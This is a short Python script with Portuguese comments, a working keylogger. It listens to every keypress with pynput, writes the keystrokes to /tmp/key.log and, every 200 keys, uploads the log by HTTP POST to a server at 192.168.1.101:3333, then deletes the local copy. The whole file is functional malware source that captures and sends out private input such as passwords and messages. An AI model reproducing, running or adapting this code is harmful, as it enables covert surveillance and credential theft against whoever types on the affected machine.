#!python
#cython: language_level=3
#importando o modulo pynput
from pynput.keyboard import Listener
#importando o modulo para expressão regular
import re
import requests
import os

# Maximo de teclas
MAX_TECLAS = 200

# Contador
teclados = 0

# url do servidor para receber o arquivo com o protocolo http, uma observação é o nome d
# campo (field) que no caso chamei de recfile

url = 'http://192.168.1.101:3333/upload'

# path do arquivo de log
arquivolog = "/tmp/key.log"


def sendFiles():
    global teclados # necessario para poder modificar um valor global
    teclados += 1
    if teclados > MAX_TECLAS:
        files = { 'recfile' : ('key.log', open("/tmp/key.log", "rb"))}
        response = requests.post(url, files=files);
        os.remove(arquivolog)
        teclados = 0

# setando caminho do arquivo

#  tratando e salvando valor em arquivo

def capturar(tecla):
    sendFiles()
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.*', '', tecla)
    with open(arquivolog, "a") as log:
        log.write(tecla)

#ouvimdo as teclas
with Listener(on_press=capturar) as l:
    l.join()


